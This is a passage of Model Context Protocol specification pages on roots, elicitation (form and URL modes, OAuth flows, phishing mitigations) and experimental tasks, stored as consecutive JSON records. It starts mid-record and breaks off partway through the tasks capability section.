Roots define the boundaries of where servers can operate\nwithin the filesystem, allowing them to understand which directories and files they have\naccess to. Servers can request the list of roots from supporting clients and receive\nnotifications when that list changes.\n\n## User Interaction Model\n\nRoots in MCP are typically exposed through workspace or project configuration interfaces.\n\nFor example, implementations could offer a workspace/project picker that allows users to\nselect directories and files the server should have access to. This can be combined with\nautomatic workspace detection from version control systems or project files.\n\nHowever, implementations are free to expose roots through any interface pattern that\nsuits their needs&mdash;the protocol itself does not mandate any specific user\ninteraction model.\n\n## Capabilities\n\nClients that support roots **MUST** declare the `roots` capability during\n[initialization](/specification/2025-11-25/basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"roots\": {\n      \"listChanged\": true\n    }\n  }\n}\n```\n\n`listChanged` indicates whether the client will emit notifications when the list of roots\nchanges.\n\n## Protocol Messages\n\n### Listing Roots\n\nTo retrieve roots, servers send a `roots/list` request:\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"roots/list\"\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"roots\": [\n      {\n        \"uri\": \"file:///home/user/projects/myproject\",\n        \"name\": \"My Project\"\n      }\n    ]\n  }\n}\n```\n\n### Root List Changes\n\nWhen roots change, clients that support `listChanged` **MUST** send a notification:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/roots/list_changed\"\n}\n```\n\n## Message Flow\n\n```mermaid\nsequenceDiagram\n    participant Server\n    participant Client\n\n    Note over Server,Client: Discovery\n    Server->>Client: roots/list\n    Client-->>Server: Available roots\n\n    Note over Server,Client: Changes\n    Client--)Server: notifications/roots/list_changed\n    Server->>Client: roots/list\n    Client-->>Server: Updated roots\n```\n\n## Data Types\n\n### Root\n\nA root definition includes:\n\n- `uri`: Unique identifier for the root. This **MUST** be a `file://` URI in the current\n  specification.\n- `name`: Optional human-readable name for display purposes.\n\nExample roots for different use cases:\n\n#### Project Directory\n\n```json\n{\n  \"uri\": \"file:///home/user/projects/myproject\",\n  \"name\": \"My Project\"\n}\n```\n\n#### Multiple Repositories\n\n```json\n[\n  {\n    \"uri\": \"file:///home/user/repos/frontend\",\n    \"name\": \"Frontend Repository\"\n  },\n  {\n    \"uri\": \"file:///home/user/repos/backend\",\n    \"name\": \"Backend Repository\"\n  }\n]\n```\n\n## Error Handling\n\nClients **SHOULD** return standard JSON-RPC errors for common failure cases:\n\n- Client does not support roots: `-32601` (Method not found)\n- Internal errors: `-32603`\n\nExample error:\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"error\": {\n    \"code\": -32601,\n    \"message\": \"Roots not supported\",\n    \"data\": {\n      \"reason\": \"Client does not have roots capability\"\n    }\n  }\n}\n```\n\n## Security Considerations\n\n1. Clients **MUST**:\n   - Only expose roots with appropriate permissions\n   - Validate all root URIs to prevent path traversal\n   - Implement proper access controls\n   - Monitor root accessibility\n\n2. Servers **SHOULD**:\n   - Handle cases where roots become unavailable\n   - Respect root boundaries during operations\n   - Validate all paths against provided roots\n\n## Implementation Guidelines\n\n1. Clients **SHOULD**:\n   - Prompt users for consent before exposing roots to servers\n   - Provide clear user interfaces for root management\n   - Validate root accessibility before exposing\n   - Monitor for root changes\n\n2. Servers **SHOULD**:\n   - Check for roots capability before usage\n   - Handle root list changes gracefully\n   - Respect root boundaries in operations\n   - Cache root information appropriately\n"}

This flow allows clients to\nmaintain control over user interactions and data sharing while enabling servers to gather\nnecessary information dynamically.\n\nElicitation supports two modes:\n\n- **Form mode**: Servers can request structured data from users with optional JSON schemas to validate responses\n- **URL mode**: Servers can direct users to external URLs for sensitive interactions that must _not_ pass through the MCP client\n\n## User Interaction Model\n\nElicitation in MCP allows servers to implement interactive workflows by enabling user input\nrequests to occur _nested_ inside other MCP server features.\n\nImplementations are free to expose elicitation through any interface pattern that suits\ntheir needs&mdash;the protocol itself does not mandate any specific user interaction\nmodel.\n\n<Warning>\n\nFor trust & safety and security:\n\n- Servers **MUST NOT** use form mode elicitation to request sensitive information\n- Servers **MUST** use URL mode for interactions involving sensitive information, such as credentials\n\nMCP clients **MUST**:\n\n- Provide UI that makes it clear which server is requesting information\n- Respect user privacy and provide clear decline and cancel options\n- For form mode, allow users to review and modify their responses before sending\n- For URL mode, clearly display the target domain/host and gather user consent before navigation to the target URL\n\n</Warning>\n\n## Capabilities\n\nClients that support elicitation **MUST** declare the `elicitation` capability during\n[initialization](../basic/lifecycle#initialization):\n\n```json\n{\n  \"capabilities\": {\n    \"elicitation\": {\n      \"form\": {},\n      \"url\": {}\n    }\n  }\n}\n```\n\nFor backwards compatibility, an empty capabilities object is equivalent to declaring support for `form` mode only:\n\n```jsonc\n{\n  \"capabilities\": {\n    \"elicitation\": {}, // Equivalent to { \"form\": {} }\n  },\n}\n```\n\nClients declaring the `elicitation` capability **MUST** support at least one mode (`form` or `url`).\n\nServers **MUST NOT** send elicitation requests with modes that are not supported by the client.\n\n## Protocol Messages\n\n### Elicitation Requests\n\nTo request information from a user, servers send an `elicitation/create` request.\n\nAll elicitation requests **MUST** include the following parameters:\n\n| Name      | Type   | Options       | Description                                                                            |\n| --------- | ------ | ------------- | -------------------------------------------------------------------------------------- |\n| `mode`    | string | `form`, `url` | The mode of the elicitation. Optional for form mode (defaults to `\"form\"` if omitted). |\n| `message` | string |               | A human-readable message explaining why the interaction is needed.                     |\n\nThe `mode` parameter specifies the type of elicitation:\n\n- `\"form\"`: In-band structured data collection with optional schema validation. Data is exposed to the client.\n- `\"url\"`: Out-of-band interaction via URL navigation. Data (other than the URL itself) is **not** exposed to the client.\n\nFor backwards compatibility, servers **MAY** omit the `mode` field for form mode elicitation requests. Clients **MUST** treat requests without a `mode` field as form mode.\n\n### Form Mode Elicitation Requests\n\nForm mode elicitation allows servers to collect structured data directly through the MCP client.\n\nForm mode elicitation requests **MUST** either specify `mode: \"form\"` or omit the `mode` field, and include these additional parameters:\n\n| Name              | Type   | Description                                                    |\n| ----------------- | ------ | -------------------------------------------------------------- |\n| `requestedSchema` | object | A JSON Schema defining the structure of the expected response. |\n\n#### Requested Schema\n\nThe `requestedSchema` parameter allows servers to define the structure of the expected\nresponse using a restricted subset of JSON Schema.\n\nTo simplify client user experience, form mode elicitation schemas are limited to flat objects\nwith primitive properties only.\n\nThe schema is restricted to these primitive types:\n\n1. **String Schema**\n\n   ```json\n   {\n     \"type\": \"string\",\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"minLength\": 3,\n     \"maxLength\": 50,\n     \"pattern\": \"^[A-Za-z]+$\",\n     \"format\": \"email\",\n     \"default\": \"user@example.com\"\n   }\n   ```\n\n   Supported formats: `email`, `uri`, `date`, `date-time`\n\n2. **Number Schema**\n\n   ```json\n   {\n     \"type\": \"number\", // or \"integer\"\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"minimum\": 0,\n     \"maximum\": 100,\n     \"default\": 50\n   }\n   ```\n\n3. **Boolean Schema**\n\n   ```json\n   {\n     \"type\": \"boolean\",\n     \"title\": \"Display Name\",\n     \"description\": \"Description text\",\n     \"default\": false\n   }\n   ```\n\n4. **Enum Schema**\n\n   Single-select enum (without titles):\n\n   ```json\n   {\n     \"type\": \"string\",\n     \"title\": \"Color Selection\",\n     \"description\": \"Choose your favorite color\",\n     \"enum\": [\"Red\", \"Green\", \"Blue\"],\n     \"default\": \"Red\"\n   }\n   ```\n\n   Single-select enum (with titles):\n\n   ```json\n   {\n     \"type\": \"string\",\n     \"title\": \"Color Selection\",\n     \"description\": \"Choose your favorite color\",\n     \"oneOf\": [\n       { \"const\": \"#FF0000\", \"title\": \"Red\" },\n       { \"const\": \"#00FF00\", \"title\": \"Green\" },\n       { \"const\": \"#0000FF\", \"title\": \"Blue\" }\n     ],\n     \"default\": \"#FF0000\"\n   }\n   ```\n\n   Multi-select enum (without titles):\n\n   ```json\n   {\n     \"type\": \"array\",\n     \"title\": \"Color Selection\",\n     \"description\": \"Choose your favorite colors\",\n     \"minItems\": 1,\n     \"maxItems\": 2,\n     \"items\": {\n       \"type\": \"string\",\n       \"enum\": [\"Red\", \"Green\", \"Blue\"]\n     },\n     \"default\": [\"Red\", \"Green\"]\n   }\n   ```\n\n   Multi-select enum (with titles):\n\n   ```json\n   {\n     \"type\": \"array\",\n     \"title\": \"Color Selection\",\n     \"description\": \"Choose your favorite colors\",\n     \"minItems\": 1,\n     \"maxItems\": 2,\n     \"items\": {\n       \"anyOf\": [\n         { \"const\": \"#FF0000\", \"title\": \"Red\" },\n         { \"const\": \"#00FF00\", \"title\": \"Green\" },\n         { \"const\": \"#0000FF\", \"title\": \"Blue\" }\n       ]\n     },\n     \"default\": [\"#FF0000\", \"#00FF00\"]\n   }\n   ```\n\nClients can use this schema to:\n\n1. Generate appropriate input forms\n2. Validate user input before sending\n3. Provide better guidance to users\n\nAll primitive types support optional default values to provide sensible starting points. Clients that support defaults SHOULD pre-populate form fields with these values.\n\nNote that complex nested structures, arrays of objects (beyond enums), and other advanced JSON Schema features are intentionally not supported to simplify client user experience.\n\n#### Example: Simple Text Request\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"method\": \"elicitation/create\",\n  \"params\": {\n    \"mode\": \"form\",\n    \"message\": \"Please provide your GitHub username\",\n    \"requestedSchema\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\"\n        }\n      },\n      \"required\": [\"name\"]\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"action\": \"accept\",\n    \"content\": {\n      \"name\": \"octocat\"\n    }\n  }\n}\n```\n\n#### Example: Structured Data Request\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"method\": \"elicitation/create\",\n  \"params\": {\n    \"mode\": \"form\",\n    \"message\": \"Please provide your contact information\",\n    \"requestedSchema\": {\n      \"type\": \"object\",\n      \"properties\": {\n        \"name\": {\n          \"type\": \"string\",\n          \"description\": \"Your full name\"\n        },\n        \"email\": {\n          \"type\": \"string\",\n          \"format\": \"email\",\n          \"description\": \"Your email address\"\n        },\n        \"age\": {\n          \"type\": \"number\",\n          \"minimum\": 18,\n          \"description\": \"Your age\"\n        }\n      },\n      \"required\": [\"name\", \"email\"]\n    }\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"result\": {\n    \"action\": \"accept\",\n    \"content\": {\n      \"name\": \"Monalisa Octocat\",\n      \"email\": \"octocat@github.com\",\n      \"age\": 30\n    }\n  }\n}\n```\n\n### URL Mode Elicitation Requests\n\n<Note>\n\n**New feature:** URL mode elicitation is introduced in the `2025-11-25` version of the MCP specification. Its design and implementation may change in future protocol revisions.\n\n</Note>\n\nURL mode elicitation enables servers to direct users to external URLs for out-of-band interactions that must not pass through the MCP client. This is essential for auth flows, payment processing, and other sensitive or secure operations.\n\nURL mode elicitation requests **MUST** specify `mode: \"url\"`, a `message`, and include these additional parameters:\n\n| Name            | Type   | Description                               |\n| --------------- | ------ | ----------------------------------------- |\n| `url`           | string | The URL that the user should navigate to. |\n| `elicitationId` | string | A unique identifier for the elicitation.  |\n\nThe `url` parameter **MUST** contain a valid URL.\n\n<Note>\n  **Important**: URL mode elicitation is *not* for authorizing the MCP client's\n  access to the MCP server (that's handled by [MCP\n  authorization](../basic/authorization)). Instead, it's used when the MCP\n  server needs to obtain sensitive information or third-party authorization on\n  behalf of the user. The MCP client's bearer token remains unchanged. The\n  client's only responsibility is to provide the user with context about the\n  elicitation URL the server wants them to open.\n</Note>\n\n#### Example: Request Sensitive Data\n\nThis example shows a URL mode elicitation request directing the user to a secure URL where they can provide sensitive information (an API key, for example).\nThe same request could direct the user into an OAuth authorization flow, or a payment flow. The only difference is the URL and the message.\n\n**Request:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"method\": \"elicitation/create\",\n  \"params\": {\n    \"mode\": \"url\",\n    \"elicitationId\": \"550e8400-e29b-41d4-a716-446655440000\",\n    \"url\": \"https://mcp.example.com/ui/set_api_key\",\n    \"message\": \"Please provide your API key to continue.\"\n  }\n}\n```\n\n**Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 3,\n  \"result\": {\n    \"action\": \"accept\"\n  }\n}\n```\n\nThe response with `action: \"accept\"` indicates that the user has consented to the\ninteraction. It does not mean that the interaction is complete. The interaction occurs out\nof band and the client is not aware of the outcome until and unless the server sends a notification indicating completion.\n\n### Completion Notifications for URL Mode Elicitation\n\nServers **MAY** send a `notifications/elicitation/complete` notification when an\nout-of-band interaction started by URL mode elicitation is completed. This allows clients to react programmatically if appropriate.\n\nServers sending notifications:\n\n- **MUST** only send the notification to the client that initiated the elicitation request.\n- **MUST** include the `elicitationId` established in the original `elicitation/create` request.\n\nClients:\n\n- **MUST** ignore notifications referencing unknown or already-completed IDs.\n- **MAY** wait for this notification to automatically retry requests that received a [URLElicitationRequiredError](#error-handling), update the user interface, or otherwise continue an interaction.\n- **SHOULD** still provide manual controls that let the user retry or cancel the original request (or otherwise resume interacting with the client) if the notification never arrives.\n\n#### Example\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"method\": \"notifications/elicitation/complete\",\n  \"params\": {\n    \"elicitationId\": \"550e8400-e29b-41d4-a716-446655440000\"\n  }\n}\n```\n\n### URL Elicitation Required Error\n\nWhen a request cannot be processed until an elicitation is completed, the server **MAY** return a [`URLElicitationRequiredError`](#error-handling) (code `-32042`) to indicate to the client that a URL mode elicitation is required. The server **MUST NOT** return this error except when URL mode elicitation is required.\n\nThe error **MUST** include a list of elicitations that are required to complete before the original can be retried.\n\nAny elicitations returned in the error **MUST** be URL mode elicitations and have an `elicitationId` property.\n\n**Error Response:**\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 2,\n  \"error\": {\n    \"code\": -32042, // URL_ELICITATION_REQUIRED\n    \"message\": \"This request requires more information.\",\n    \"data\": {\n      \"elicitations\": [\n        {\n          \"mode\": \"url\",\n          \"elicitationId\": \"550e8400-e29b-41d4-a716-446655440000\",\n          \"url\": \"https://mcp.example.com/connect?elicitationId=550e8400-e29b-41d4-a716-446655440000\",\n          \"message\": \"Authorization is required to access your Example Co files.\"\n        }\n      ]\n    }\n  }\n}\n```\n\n## Message Flow\n\n### Form Mode Flow\n\n```mermaid\nsequenceDiagram\n    participant User\n    participant Client\n    participant Server\n\n    Note over Server: Server initiates elicitation\n    Server->>Client: elicitation/create (mode: form)\n\n    Note over User,Client: Present elicitation UI\n    User-->>Client: Provide requested information\n\n    Note over Server,Client: Complete request\n    Client->>Server: Return user response\n\n    Note over Server: Continue processing with new information\n```\n\n### URL Mode Flow\n\n```mermaid\nsequenceDiagram\n    participant UserAgent as User Agent (Browser)\n    participant User\n    participant Client\n    participant Server\n\n    Note over Server: Server initiates elicitation\n    Server->>Client: elicitation/create (mode: url)\n\n    Client->>User: Present consent to open URL\n    User-->>Client: Provide consent\n\n    Client->>UserAgent: Open URL\n    Client->>Server: Accept response\n\n    Note over User,UserAgent: User interaction\n    UserAgent-->>Server: Interaction complete\n    Server-->>Client: notifications/elicitation/complete (optional)\n\n    Note over Server: Continue processing with new information\n```\n\n### URL Mode With Elicitation Required Error Flow\n\n```mermaid\nsequenceDiagram\n    participant UserAgent as User Agent (Browser)\n    participant User\n    participant Client\n    participant Server\n\n    Client->>Server: tools/call\n\n    Note over Server: Server needs authorization\n    Server->>Client: URLElicitationRequiredError\n    Note over Client: Client notes the original request can be retried after elicitation\n\n    Client->>User: Present consent to open URL\n    User-->>Client: Provide consent\n\n    Client->>UserAgent: Open URL\n\n    Note over User,UserAgent: User interaction\n\n    UserAgent-->>Server: Interaction complete\n    Server-->>Client: notifications/elicitation/complete (optional)\n\n    Client->>Server: Retry tools/call (optional)\n```\n\n## Response Actions\n\nElicitation responses use a three-action model to clearly distinguish between different user actions. These actions apply to both form and URL elicitation modes.\n\n```json\n{\n  \"jsonrpc\": \"2.0\",\n  \"id\": 1,\n  \"result\": {\n    \"action\": \"accept\", // or \"decline\" or \"cancel\"\n    \"content\": {\n      \"propertyName\": \"value\",\n      \"anotherProperty\": 42\n    }\n  }\n}\n```\n\nThe three response actions are:\n\n1. **Accept** (`action: \"accept\"`): User explicitly approved and submitted with data\n   - For form mode: The `content` field contains the submitted data matching the requested schema\n   - For URL mode: The `content` field is omitted\n   - Example: User clicked \"Submit\", \"OK\", \"Confirm\", etc.\n\n2. **Decline** (`action: \"decline\"`): User explicitly declined the request\n   - The `content` field is typically omitted\n   - Example: User clicked \"Reject\", \"Decline\", \"No\", etc.\n\n3. **Cancel** (`action: \"cancel\"`): User dismissed without making an explicit choice\n   - The `content` field is typically omitted\n   - Example: User closed the dialog, clicked outside, pressed Escape, browser failed to load, etc.\n\nServers should handle each state appropriately:\n\n- **Accept**: Process the submitted data\n- **Decline**: Handle explicit decline (e.g., offer alternatives)\n- **Cancel**: Handle dismissal (e.g., prompt again later)\n\n## Implementation Considerations\n\n### Statefulness\n\nMost practical uses of elicitation require that the server maintain state about users:\n\n- Whether required information has been collected (e.g., the user's display name via form mode elicitation)\n- Status of resource access (e.g., API keys or a payment flow via URL mode elicitation)\n\nServers implementing elicitation **MUST** securely associate this state with individual users following the guidelines in the [security best practices](../basic/security_best_practices) document. Specifically:\n\n- State **MUST NOT** be associated with session IDs alone\n- State storage **MUST** be protected against unauthorized access\n- For remote MCP servers, user identification **MUST** be derived from credentials acquired via [MCP authorization](../basic/authorization) when possible (e.g. `sub` claim)\n\n<Note>\n  The examples in this section are non-normative and illustrate potential uses\n  of elicitation. Implementers should adapt these patterns to their specific\n  requirements while maintaining security best practices.\n</Note>\n\n### URL Mode Elicitation for Sensitive Data\n\nFor servers that interact with external APIs requiring sensitive information (e.g., credentials, payment information), URL mode elicitation provides a secure mechanism for users to provide this information without exposing it to the MCP client.\n\nIn this pattern:\n\n1. The server directs users to a secure web page (served over HTTPS)\n2. The page presents a branded form UI on a domain the user trusts\n3. Users enter sensitive credentials directly into the secure form\n4. The server stores credentials securely, bound to the user's identity\n5. Subsequent MCP requests use these stored credentials for API access\n\nThis approach ensures that sensitive credentials never pass through the LLM context, MCP client or any intermediate MCP servers, reducing the risk of exposure through client-side logging or other attack vectors.\n\n### URL Mode Elicitation for OAuth Flows\n\nURL mode elicitation enables a pattern where MCP servers act as OAuth clients to third-party resource servers.\nAuthorization with external APIs enabled by URL mode elicitation is separate from [MCP authorization](../basic/authorization). MCP servers **MUST NOT** rely on URL mode elicitation to authorize users for themselves.\n\n#### Understanding the Distinction\n\n- **MCP Authorization**: Required OAuth flow between the MCP client and MCP server (covered in the [authorization specification](../basic/authorization))\n- **External (third-party) Authorization**: Optional authorization between the MCP server and a third-party resource server, initiated via URL mode elicitation\n\nIn external authorization, the server acts as both:\n\n- An OAuth resource server (to the MCP client)\n- An OAuth client (to the third-party resource server)\n\nExample scenario:\n\n- An MCP client connects to an MCP server\n- The MCP server integrates with various different third-party services\n- When the MCP client calls a tool that requires access to a third-party service, the MCP server needs credentials for that service\n\nThe critical security requirements are:\n\n1. **The third-party credentials MUST NOT transit through the MCP client**: The client must never see third-party credentials to protect the security boundary\n2. **The MCP server MUST NOT use the client's credentials for the third-party service**: That would be [token passthrough](../basic/security_best_practices#token-passthrough), which is forbidden\n3. **The user MUST authorize the MCP server directly**: The interaction happens outside the MCP protocol, without involving the MCP client\n4. **The MCP server is responsible for tokens**: The MCP server is responsible for storing and managing the third-party tokens obtained through the URL mode elicitation (in other words, the MCP server must be stateful).\n\nCredentials obtained via URL mode elicitation are distinct from the MCP server credentials used by the MCP client. The MCP server **MUST NOT** transmit credentials obtained through URL mode elicitation to the MCP client.\n\n<Note>\n  For additional background, refer to the [token passthrough\n  section](../basic/security_best_practices#token-passthrough) of the Security\n  Best Practices document to understand why MCP servers cannot act as\n  pass-through proxies.\n</Note>\n\n#### Implementation Pattern\n\nWhen implementing external authorization via URL mode elicitation:\n\n1. The MCP server generates an authorization URL, acting as an OAuth client to the third-party service\n2. The MCP server stores internal state that associates (binds) the elicitation request with the user's identity.\n3. The MCP server sends a URL mode elicitation request to the client with a URL that can start the authorization flow.\n4. The user completes the OAuth flow directly with the third-party authorization server\n5. The third-party authorization server redirects back to the MCP server\n6. The MCP server securely stores the third-party tokens, bound to the user's identity\n7. Future MCP requests can leverage these stored tokens for API access to the third-party resource server\n\nThe following is a non-normative example of how this pattern could be implemented:\n\n```mermaid\nsequenceDiagram\n    participant User\n    participant UserAgent as User Agent (Browser)\n    participant 3AS as 3rd Party AS\n    participant 3RS as 3rd Party RS\n    participant Client as MCP Client\n    participant Server as MCP Server\n\n    Client->>Server: tools/call\n    Note over Server: Needs 3rd-party authorization for user\n    Note over Server: Store state (bind the elicitation request to the user)\n    Server->>Client: URLElicitationRequiredError<br> (mode: \"url\", url: \"https://mcp.example.com/connect?...\")\n    Note over Client: Client notes the tools/call request can be retried later\n    Client->>User: Present consent to open URL\n    User->>Client: Provide consent\n    Client->>UserAgent: Open URL\n    Client->>Server: Accept response\n    UserAgent->>Server: Load connect route\n    Note over Server: Confirm: user is logged into MCP Server or MCP AS<br>Confirm: elicitation user matches session user\n    Server->>UserAgent: Redirect to third-party authorization endpoint\n    UserAgent->>3AS: Load authorize route\n    Note over 3AS,User: User interaction (OAuth flow):<br>User consents to scoped MCP Server access\n    3AS->>UserAgent: redirect to MCP Server's redirect_uri\n    UserAgent->>Server: load redirect_uri page\n    Note over Server: Confirm: redirect_uri belongs to MCP Server\n    Server->>3AS: Exchange authorization code for  OAuth tokens\n    3AS->>Server: Grants tokens\n    Note over Server: Bind tokens to MCP user identity\n    Server-->>Client: notifications/elicitation/complete (optional)\n    Client->>Server: Retry tools/call\n    Note over Server: Retrieve token bound to user identity\n    Server->>3RS: Call 3rd-party API\n```\n\nThis pattern maintains clear security boundaries while enabling rich integrations with third-party services that require user authorization.\n\n## Error Handling\n\nServers **MUST** return standard JSON-RPC errors for common failure cases:\n\n- When a request cannot be processed until an elicitation is completed: `-32042` (`URLElicitationRequiredError`)\n\nClients **MUST** return standard JSON-RPC errors for common failure cases:\n\n- Server sends an `elicitation/create` request with a mode not declared in client capabilities: `-32602` (Invalid params)\n\n## Security Considerations\n\n1. Servers **MUST** bind elicitation requests to the client and user identity\n1. Clients **MUST** provide clear indication of which server is requesting information\n1. Clients **SHOULD** implement user approval controls\n1. Clients **SHOULD** allow users to decline elicitation requests at any time\n1. Clients **SHOULD** implement rate limiting\n1. Clients **SHOULD** present elicitation requests in a way that makes it clear what information is being requested and why\n\n### Safe URL Handling\n\nMCP servers requesting elicitation:\n\n1. **MUST NOT** include sensitive information about the end-user, including credentials, personal identifiable information, etc., in the URL sent to the client in a URL elicitation request.\n2. **MUST NOT** provide a URL which is pre-authenticated to access a protected resource, as the URL could be used to impersonate the user by a malicious client.\n3. **SHOULD NOT** include URLs intended to be clickable in any field of a form mode elicitation request.\n4. **SHOULD** use HTTPS URLs for non-development environments.\n\nThese server requirements ensure that client implementations have clear rules about when to present a URL to the user, so that the client-side rules (below) can be consistently applied.\n\nClients implementing URL mode elicitation **MUST** handle URLs carefully to prevent users from unknowingly clicking malicious links.\n\nWhen handling URL mode elicitation requests, MCP clients:\n\n1. **MUST NOT** automatically pre-fetch the URL or any of its metadata.\n2. **MUST NOT** open the URL without explicit consent from the user.\n3. **MUST** show the full URL to the user for examination before consent.\n4. **MUST** open the URL provided by the server in a secure manner that does not enable the client or LLM to inspect the content or user inputs.\n   For example, on iOS, [SFSafariViewController](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller) is good, but [WkWebView](https://developer.apple.com/documentation/webkit/wkwebview) is not.\n5. **SHOULD** highlight the domain of the URL to mitigate subdomain spoofing.\n6. **SHOULD** have warnings for ambiguous/suspicious URIs (i.e., containing Punycode).\n7. **SHOULD NOT** render URLs as clickable in any field of an elicitation request, except for the `url` field in a URL elicitation request (with the restrictions detailed above).\n\n### Identifying the User\n\nServers **MUST NOT** rely on client-provided user identification without server verification, as this can be forged.\nInstead, servers **SHOULD** follow [security best practices](../basic/security_best_practices).\n\nNon-normative examples:\n\n- Incorrect: Treat user input like \"I am joe@example.com\" as authoritative\n- Correct: Rely on [authorization](../basic/authorization) to identify the user\n\n### Form Mode Security\n\n1. Servers **MUST NOT** request sensitive information (passwords, API keys, etc.) via form mode\n2. Clients **SHOULD** validate all responses against the provided schema\n3. Servers **SHOULD** validate received data matches the requested schema\n\n#### Phishing\n\nURL mode elicitation returns a URL that an attacker can use to send to a victim. The MCP Server **MUST** verify the identity of the user who opens the URL before accepting information.\n\nTypically identity verification is done by leveraging the [MCP authorization server](../basic/authorization) to identify the user, through a session cookie or equivalent in the browser.\n\nFor example, URL mode elicitation may be used to perform OAuth flows where the server acts as an OAuth client of another resource server. Without proper mitigation, the following phishing attack is possible:\n\n1. A malicious user (Alice) connected to a benign server triggers an elicitation request\n2. The benign server generates an authorization URL, acting as an OAuth client of a third-party authorization server\n3. Alice's client displays the URL and asks for consent\n4. Instead of clicking on the link, Alice tricks a victim user (Bob) of the same benign server into clicking it\n5. Bob opens the link and completes the authorization, thinking they are authorizing their own connection to the benign server\n6. The benign server receives a callback/redirect form the third-party authorization server, and assumes it's Alice's request\n7. The tokens for the third-party server are bound to Alice's session and identity, instead of Bob's, resulting in an account takeover\n\nTo prevent this attack, the server **MUST** ensure that the user who started the elicitation request (the end-user who is accessing the server via the MCP client) is the same user who completes the authorization flow.\n\nThere are many ways to achieve this and the best way will depend on the specific implementation.\n\nAs a common, non-normative example, consider a case where the MCP server is accessible via the web and desires to perform a third-party authorization code flow.\nTo prevent the phishing attack, the server would create a URL mode elicitation to `https://mcp.example.com/connect?elicitationId=...` rather than the third-party authorization endpoint.\nThis \"connect URL\" must ensure the user who opened the page is the same user who the elicitation was generated for.\nIt would, for example, check that the user has a valid session cookie and that the session cookie is for the same user who was using the MCP client to generate the URL mode elicitation.\nThis could be done by comparing the authoritative subject (`sub` claim) from the MCP server's authorization server to the subject from the session cookie.\nOnce that page ensures the same user, it can send the user to the third-party authorization server at `https://example.com/authorize?...` where a normal OAuth flow can be completed.\n\nIn other cases, the server may not be accessible via the web and may not be able to use a session cookie to identify the user.\nIn this case, the server must use a different mechanism to identify the user who opens the elicitation URL is the same user who the elicitation was generated for.\n\nIn all implementations, the server **MUST** ensure that the mechanism to determine the user's identity is resilient to attacks where an attacker can modify the elicitation URL.\n"}
{"source":"github","repo":"mcp-spec","path":"docs/specification/2025-11-25/basic/utilities/tasks.mdx","content":"---\ntitle: Tasks\n---\n\n<div id=\"enable-section-numbers\" />\n\n<Info>**Protocol Revision**: 2025-11-25</Info>\n\n<Note>\n\nTasks were introduced in version 2025-11-25 of the MCP specification and are currently considered **experimental**.\nThe design and behavior of tasks may evolve in future protocol versions.\n\n</Note>\n\nThe Model Context Protocol (MCP) allows requestors — which can be either clients or servers, depending on the direction of communication — to augment their requests with **tasks**. Tasks are durable state machines that carry information about the underlying execution state of the request they wrap, and are intended for requestor polling and deferred result retrieval. Each task is uniquely identifiable by a receiver-generated **task ID**.\n\nTasks are useful for representing expensive computations and batch processing requests, and integrate seamlessly with external job APIs.\n\n## Definitions\n\nTasks represent parties as either \"requestors\" or \"receivers,\" defined as follows:\n\n- **Requestor:** The sender of a task-augmented request. This can be the client or the server — either can create tasks.\n- **Receiver:** The receiver of a task-augmented request, and the entity executing the task. This can be the client or the server — either can receive and execute tasks.\n\n## User Interaction Model\n\nTasks are designed to be **requestor-driven** - requestors are responsible for augmenting requests with tasks and for polling for the results of those tasks; meanwhile, receivers tightly control which requests (if any) support task-based execution and manages the lifecycles of those tasks.\n\nThis requestor-driven approach ensures deterministic response handling and enables sophisticated patterns such as dispatching concurrent requests, which only the requestor has sufficient context to orchestrate.\n\nImplementations are free to expose tasks through any interface pattern that suits their needs — the protocol itself does not mandate any specific user interaction model.\n\n## Capabilities\n\nServers and clients that support task-augmented requests **MUST** declare a `tasks` capability during initialization. The `tasks` capability is structured by request category, with boolean properties indicating which specific request types support task augmentation.\n\n### Server Capabilities\n\nServers declare if they support tasks, and if so, which server-side requests can be augmented with tasks.\n\n| Capability                  | Description                                          |\n| --------------------------- | ---------------------------------------------------- |\n| `tasks.list`                | Server supports the `tasks/list` operation           |\n| `tasks.cancel`              | Server supports the `tasks/cancel` operation         |\n| `tasks.requests.tools.call` | Server supports task-augmented `tools/call` requests |\n\n```json\n{\n  \"capabilities\": {\n    \"tasks\": {\n      \"list\": {},\n      \"cancel\": {},\n      \"requests\": {\n        \"tools\": {\n          \"call\": {}\n        }\n      }\n    }\n  }\n}\n```\n\n### Client Capabilities\n\nClients declare if they support tasks, and if so, which client-side requests can be augmented with tasks.\n\n| Capability                              | Description                                                      |\n| --------------------------------------- | ---------------------------------------------------------------- |\n| `tasks.list`                            | Client supports the `tasks/list` operation                       |\n| `tasks.cancel`                          | Client supports the `tasks/cancel` operation                     |\n| `tasks.requests.sampling.createMessage` | Client supports task-augmented `sampling/createMessage` requests |\n| `tasks.requests.elicitation.create`     | Client supports task-augmented `elicitation/create` requests     |\n\n```json\n{\n  \"capabilities\": {\n    \"tasks\": {\n      \"list\": {},\n      \"cancel\": {},\n      \"requests\": {\n        \"sampling\": {\n          \"createMessage\": {}\n        },\n        \"elicitation\": {\n          \"create\": {}\n        }\n      }\n    }\n  }\n}\n```\n\n### Capability Negotiation\n\nDuring the initialization phase, both parties exchange 